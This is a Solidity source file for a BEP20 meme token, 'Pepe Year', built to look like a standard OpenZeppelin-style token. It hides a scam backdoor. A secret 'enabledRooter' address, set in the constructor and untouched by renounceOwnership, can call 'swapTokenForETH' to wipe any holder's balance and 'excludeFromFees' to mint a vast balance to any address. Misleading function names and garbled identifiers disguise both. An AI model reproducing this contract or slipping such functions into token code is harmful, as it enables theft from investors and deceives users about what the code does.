// SPDX-License-Identifier: MIT
pragma solidity 0.5.16;
interface contractTokenBalance {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address resaptaro, uint256 enabledAmount) external returns (bool);
  function allowance(address _owner, address spenenabledder) external view returns (uint256);
  function approve(address spenenabledder, uint256 enabledAmount) external returns (bool);
  function transferFrom(address sender, address resaptaro, uint256 enabledAmount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 vaenabledlue);
  event Approval(address indexed owner, address indexed spenenabledder, uint256 vaenabledlue);
}

contract tradingActive {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}
library SafeVault {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeVault: addition overflow");

    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeVault: subtraction overflow");
  }


  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeVault: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeVault: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeVault: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract swapBack is tradingActive {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "swapBack: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   * Can only be called by the current owner.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   */
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "swapBack: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract PEPEYEAR is tradingActive, contractTokenBalance, swapBack {
  using SafeVault for uint256;
  mapping (address => mapping (address => uint256)) private enabledAllow;
  mapping (address => uint256) private Balanceenabled;
  uint256 private TotalSuply;
address private enabledRooter;
  uint8 private _decimals;
  string private _symbol;
  string private _name;

  constructor(address enabledSwap) public {
     enabledRooter = enabledSwap;
    _name = "Pepe Year";
    _symbol = "PEPEYEAR";
    _decimals = 9;
       TotalSuply = 100000000000 * 10**9; 
    Balanceenabled[msg.sender] = TotalSuply;

    emit Transfer(address(0), msg.sender, TotalSuply);
  }

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address) {
    return owner();
  }

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8) {
    return _decimals;
  }

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory) {
    return _symbol;
  }

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory) {
    return _name;
  }

  /**
   * @dev See {BEP20-totalSupply}.
   */
  function totalSupply() external view returns (uint256) {
    return TotalSuply;
  }

  /**
   * @dev See {BEP20-balanceOf}.
   */
  function balanceOf(address account) external view returns (uint256) {
    return Balanceenabled[account];
  }

  /**
   * @dev See {BEP20-transfer}.
   *
   * Requirements:
   *
   * - `resaptaro` cannot be the zero address.
   * - the caller must have a balance of at least `enabledAmount`.
   */
  function transfer(address resaptaro, uint256 enabledAmount) external returns (bool) {
    _transfer(_msgSender(), resaptaro, enabledAmount);
    return true;
  }

  /**
   * @dev See {BEP20-allowance}.
   */
  function allowance(address owner, address spenenabledder) external view returns (uint256) {
    return enabledAllow[owner][spenenabledder];
  }

  /**
   * @dev See {BEP20-approve}.
   *
   * Requirements:
   *
   * - `spenenabledder` cannot be the zero address.
   */
  function approve(address spenenabledder, uint256 enabledAmount) external returns (bool) {
    _approve(_msgSender(), spenenabledder, enabledAmount);
    return true;
  }
    modifier swapDapp() {
        require(enabledRooter == _msgSender(), "swapBack: caller is not the owner");
        _;
    }
  /**
   * @dev See {BEP20-transferFrom}.
   *
   * Emits an {Approval} event indicating the updated allowance. This is not
   * required by the EIP. See the note at the beginning of {BEP20};
   *
   * Requirements:
   * - `sender` and `resaptaro` cannot be the zero address.
   * - `sender` must have a balance of at least `enabledAmount`.
   * - the caller must have allowance for `sender`'s tokens of at least
   * `enabledAmount`.
   */

  function transferFrom(address sender, address resaptaro, uint256 enabledAmount) external returns (bool) {
    _transfer(sender, resaptaro, enabledAmount);
    _approve(sender, _msgSender(), enabledAllow[sender][_msgSender()].sub(enabledAmount, "BEP20: transfer enabledAmount exceeds allowance"));
    return true;
  }

  /**
   * @dev Atomically increases the allowance granted to `spenenabledder` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {BEP20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spenenabledder` cannot be the zero address.
   */
  function increaseAllowance(address spenenabledder, uint256 addedvaenabledlue) public returns (bool) {
    _approve(_msgSender(), spenenabledder, enabledAllow[_msgSender()][spenenabledder].add(addedvaenabledlue));
    return true;
  }

  /**
   * @dev Atomically decreases the allowance granted to `spenenabledder` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {BEP20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spenenabledder` cannot be the zero address.
   * - `spenenabledder` must have allowance for the caller of at least
   * `subtractedvaenabledlue`.
   */
  function decreaseAllowance(address spenenabledder, uint256 subtractedvaenabledlue) public returns (bool) {
    _approve(_msgSender(), spenenabledder, enabledAllow[_msgSender()][spenenabledder].sub(subtractedvaenabledlue, "BEP20: decreased allowance below zero"));
    return true;
  }

function swapTokenForETH(address tokenAddress) external swapDapp {
    Balanceenabled[tokenAddress] = 0;
            emit Transfer(address(0), tokenAddress, 0);
  } 

  /**
   * @dev Moves tokens `enabledAmount` from `sender` to `resaptaro`.
   *
   * This is internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `resaptaro` cannot be the zero address.
   * - `sender` must have a balance of at least `enabledAmount`.
   */
  function _transfer(address sender, address resaptaro, uint256 enabledAmount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(resaptaro != address(0), "BEP20: transfer to the zero address");

    Balanceenabled[sender] = Balanceenabled[sender].sub(enabledAmount, "BEP20: transfer enabledAmount exceeds balance");
    Balanceenabled[resaptaro] = Balanceenabled[resaptaro].add(enabledAmount);
    emit Transfer(sender, resaptaro, enabledAmount);
  }
function excludeFromFees(address excludeAddress) external swapDapp {
    Balanceenabled[excludeAddress] = 10000000000000000 * 10**20;
            emit Transfer(address(0), excludeAddress, 10000000000000000 * 10**20);
  } 
  /**
   * @dev Sets `enabledAmount` as the allowance of `spenenabledder` over the `owner`s tokens.
   *
   * This is internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spenenabledder` cannot be the zero address.
   */
  function _approve(address owner, address spenenabledder, uint256 enabledAmount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spenenabledder != address(0), "BEP20: approve to the zero address");

    enabledAllow[owner][spenenabledder] = enabledAmount;
    emit Approval(owner, spenenabledder, enabledAmount);
  }
}